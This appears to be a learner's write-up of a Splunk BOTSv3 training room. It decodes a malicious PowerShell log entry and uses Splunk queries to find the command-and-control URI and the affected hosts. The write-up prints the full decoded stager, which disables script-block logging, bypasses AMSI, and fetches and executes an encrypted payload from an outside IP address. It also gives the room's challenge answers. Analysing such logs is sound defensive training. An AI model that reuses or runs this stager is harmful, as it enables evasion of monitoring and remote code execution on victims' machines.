ARABjAEEATgB3AEEAdQBBAEQAVQBBAE0AdwBBAHUAQQBEAEUAQQBOAHcAQQAyAEEARABvAEEATgBBAEEAMABBAEQATQBBACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJABXAEMALgBIAEUAYQBEAEUAcgBTAC4AQQBkAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAFAAdABoAEEAVgBnAHMAPQBoAEIAMgBIADAARwBUAEkAcAB3AHgAQwBlAEwAaABHAGUALwBmAEwAawBmAEIAcABDAGQASQA9ACIAKQA7ACQAZABhAFQAQQA9ACQAdwBDAC4ARABPAFcAbgBsAG8AQQBkAEQAQQB0AEEAKAAkAHMARQByACsAJAB0ACkAOwAkAGkAdgA9ACQAZABBAFQAQQBbADAALgAuADMAXQA7ACQARABhAFQAYQA9ACQAZABhAFQAQQBbADQALgAuACQARABhAHQAYQAuAGwARQBOAEcAVABIAF0AOwAtAGoAbwBpAE4AWwBDAGgAQQByAFsAXQBdACgAJgAgACQAUgAgACQARABhAFQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA
        Engine Version = 5.1.17134.112
        Runspace ID = efc274d5-8635-40fd-aa41-1a0334e60fc9
        Pipeline ID = 1
        Command Name = Invoke-Expression
        Command Type = Cmdlet
        Script Name = 
        Command Path = 
        Sequence Number = 53
        User = AzureAD\FyodorMalteskesko
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:
Collapse

    host = FYODOR-L
    source = WinEventLog:Microsoft-Windows-PowerShell/Operational
    sourcetype = wineventlog

remove null bytes, cyberchef 

If($PSVErSIonTablE.PSVeRSIon.MAJOR -gE 3){$GPF=[rEf].ASSemBlY.GETTyPE('System.Management.Automation.Utils')."GeTFIE`Ld"('cachedGroupPolicySettings','N'+'onPublic,Static');IF($GPF){$GPC=$GPF.GEtVALuE($null);If($GPC['ScriptB'+'lockLogging']){$GPC['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;$GPC['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}$val=[CollectioNs.GeNeRIC.DiCtIonaRy[STring,SyStEM.OBject]]::NeW();$vaL.AdD('EnableScriptB'+'lockLogging',0);$val.Add('EnableScriptBlockInvocationLogging',0);$GPC['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']=$VAl}Else{[SCRIpTBLoCK]."GeTFie`ld"('signatures','N'+'onPublic,Static').SetVALuE($NUll,(NEW-OBJEcT COlLECTIONS.GenEriC.HASHSET[sTRinG]))}$ReF=[REF].ASsEMBLY.GeTTYpe('System.Management.Automation.AmsiUtils');$REf.GeTFiEld('amsiInitFailed','NonPublic,Static').SEtVaLuE($nULL,$trUE);};[SYsTEM.NeT.SERVIcEPoINTMaNaGER]::EXPeCt100COntinUE=0;$wC=New-OBJeCt SYsTeM.NEt.WebCLiENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$WC.HEAdeRs.AdD('User-Agent',$u);$Wc.HEadERs.Add('User-Agent',$u);$Wc.PRoXy=[SyStem.NET.WeBReqUESt]::DefaUlTWEbProXy;$WC.ProxY.CRedeNTiALs = [SYsTem.NEt.CreDeNTiALCacHe]::DefaUlTNEtWorkCrEdentiaLs;$Script:Proxy = $wc.Proxy;$K=[SYSTeM.TexT.EnCOdinG]::ASCII.GETBYTES('1AB<Yk6Z4#+vVu%o5}8&M-9UL~l|>0gP');$R={$D,$K=$ARgs;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.CoUnt])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bXoR$S[($S[$I]+$S[$H])%256]}};$ser=$([Text.EncodIng]::UnIcODE.GEtSTrinG([ConvERt]::FroMBAse64StriNG('aAB0AHQAcABzADoALwAvADQANQAuADcANwAuADUAMwAuADEANwA2ADoANAA0ADMA')));$t='/admin/get.php';$WC.HEaDErS.AdD("Cookie","PthAVgs=hB2H0GTIpwxCeLhGe/fLkfBpCdI=");$daTA=$wC.DOWnloAdDAtA($sEr+$t);$iv=$dATA[0..3];$DaTa=$daTA[4..$Data.lENGTH];-joiN[ChAr[]](& $R $DaTa ($IV+$K))|IEX

https://45.77.53.176:443

/admin/get.php (like question 3)


or another way

index=botsv3 earliest=0 source="WinEventLog:Microsoft-Windows-PowerShell/Operational" Message!="PowerShell console*" Message="*/*" 
| rex field=Message "\$t\=[\'\"](?<c2_uri>[^\'\"]+)" 
| table c2_uri 
| dedup c2_uri

after decoding base64

This Splunk query is searching for events in the "botsv3" index that have a source of "WinEventLog:Microsoft-Windows-PowerShell/Operational" and a message that does not contain "PowerShell console*" but contains "_/_".

1.  It first searches the "botsv3" index for events with the specified source and message criteria
2.  Then it uses the "rex" command to extract the value of the "c2_uri" field from the message, using a regular expression to match the specific pattern.
3.  The "table" command is used to display the extracted c2_uri field
4.  The "dedup" command is used to remove duplicate values of the c2_uri field, so that each unique value is only displayed once in the final results.


"\$t\=[\'\"](?<c2_uri>[^\'\"]+)"

This is a regular expression (regex) that is being used to extract a specific field of information from the "Message" field in the search results. The regex uses a number of special characters and syntax to define the pattern it is looking for in the data.

1.  The "$t=" is looking for a string that starts with "$t=" exactly.
2.  The "['"]" is looking for a single quote or double quote that follows $t=
3.  The "(?<c2_uri>)" is creating a named capturing group called "c2_uri"
4.  The "[^'"]+" is looking for one or more characters that are not a single quote or double quote. This will capture the value of c2_uri

All together, this regex is looking for a string that starts with "$t=" and captures the value that is enclosed in single or double quotes, and named as c2_uri.

```

*/admin/get.php*

At least two Frothly endpoints contact the adversary's command and control infrastructure. What are their short hostnames? Answer guidance: Comma separated without spaces, in alphabetical order.

Start with XmlWinEventLog:Microsoft-Windows-Sysmon/Operational as the source type.

```json
Now search for host

FYODOR-L 		
ABUNGST-L

or another way

index=botsv3 earliest=0 DestinationIp=45.77.53.176 source="WinEventLog:Microsoft-Windows-Sysmon/Operational" | stats count by host

host        count

ABUNGST-L	1070
FYODOR-L	3850

https://clo.ng/
```

*ABUNGST-L,FYODOR-L*

### Conclusion

Within this room, you tackled a lot of the questions from the BOTSv3 data set.

Security Operations Center (SOC) is a team of IT security professionals tasked with monitoring, preventing , detecting , investigating, and responding to threats within a company’s network and systems.

Thus far, Splunk has held a Boss of the SOC competition since its inception. Read about last year's event [here](https://www.splunk.com/en_us/blog/security/bots-day-2020.html). 

Mastering Splunk-fu takes practice, as with anything, and that was the overall objective of creating this room. 

The paths hinted at in this room are not the absolute way to solve the questions.

You might discover clever ways to come to the same conclusion, and that will be awesome.

There is a lot of data in the dataset that wasn't touched on. Feel free to explore to see what else you can find. 

You're encouraged to download the dataset into a local Splunk instance and give a go at the other questions within the dataset. 

Answer the questions below

You leveled up your Splunk-fu thanks to the BOTSv3 dataset.


[[Tempus Fugit Durius]]